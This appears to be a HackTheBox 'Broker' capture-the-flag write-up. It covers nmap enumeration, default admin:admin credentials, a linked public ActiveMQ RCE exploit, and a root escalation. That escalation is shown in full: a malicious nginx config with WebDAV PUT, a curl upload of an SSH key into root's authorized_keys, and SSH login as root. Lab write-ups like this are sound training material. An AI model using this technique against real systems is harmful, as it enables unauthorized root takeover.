---
title: "Broker"
date: 2025-01-23
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "broker", "htb walkthrough", "hackthebox", "writeup"]
---

OS: Linux
Difficulty : Easy

## Enumeration

>- Using `admin : admin` provides access to the admin portal.

### Nmap

```sh
└─$ nmap -sC -sV 10.10.11.243                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 13:33 AEST
Nmap scan report for 10.10.11.243
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80-HTTP

![screenshot](/assets/images/broker1.png)

-> signed in as `admin : admin`

![screenshot](/assets/images/broker2.png)

- ActiveMQ 5.15.15

#### gobuster

![screenshot](/assets/images/broker3.png)

## Initial Access

>- Using the [public exploit](https://github.com/X1r0z/ActiveMQ-RCE/tree/main), gained initial access as activemq.
	- Had to install go lang. 

[Reference](https://www.prio-n.com/blog/cve-2023-46604-attacking-defending-ActiveMQ)

The modified poc.xml

![screenshot](/assets/images/broker4.png)

[Installing golang reference](https://medium.com/@yadav-ajay/go-lang-on-kali-linux-5cc40a78d7de)

![screenshot](/assets/images/broker5.png)

## Privilege Escalation

>- `sudo -l` activemq has sudo privileges to run `/usr/sbin/nginx`.
- Modify `nginx.conf` with malicious payload.
	- change the user to root from www-data so the nginx process runs from root.
	- add listening port.
- Generate ssh key.
	- `curl PUT` to put the generated ssh public key via the listening port. 
- SSH as root.a

![screenshot](/assets/images/broker6.png)

![screenshot](/assets/images/broker7.png)

![screenshot](/assets/images/broker8.png)

```sh
/usr/bin/java -Xms64M -Xmx1G -Djava.util.logging.config.file=logging.properties -Djava.security.auth.login.config=/opt/apache-activemq-5.15.15//conf/login.config -Dcom.sun.management.jmxremote -Djava.awt.headless=true -Djava.io.tmpdir=/opt/apache-activemq-5.15.15//tmp -Dactivemq.classpath=/opt/apache-activemq-5.15.15//conf:/opt/apache-activemq-5.15.15//../lib/: -Dactivemq.home=/opt/apache-activemq-5.15.15/ -Dactivemq.base=/opt/apache-activemq-5.15.15/ -Dactivemq.conf=/opt/apache-activemq-5.15.15//conf -Dactivemq.data=/opt/apache-activemq-5.15.15//data -jar /opt/apache-activemq-5.15.15//bin/activemq.jar start 
```

```sh
# show comments only
cat nginx.conf | grep -v '\#' | grep .
```

![screenshot](/assets/images/broker9.png)

change the user to root on `nginx.conf`

To use `ngx_http_dav_module` to write my public SSH key into the root's `authorized_keys`, create the malicious NGINX configuration file as below. 

pwn.conf

```sh
user root; # worker processes will be run by root
worker_processes 4;
pid /tmp/nginx.pid;
events {
		worker_connections 768;
}
http {
	server {
		listen 1337;
		root /;
		autoindex on;
		dav_methods PUT;
	}
}
```

![screenshot](/assets/images/broker10.png)

![screenshot](/assets/images/broker11.png)

![screenshot](/assets/images/broker12.png)

From Kali

```sh
ssh-keygen -f broker

curl 10.10.11.243:1337/root/.ssh/authorized_keys --upload-file broker.pub
```

ssh as root

```sh
ssh -i broker root@10.10.11.243
```

![screenshot](/assets/images/broker13.png)
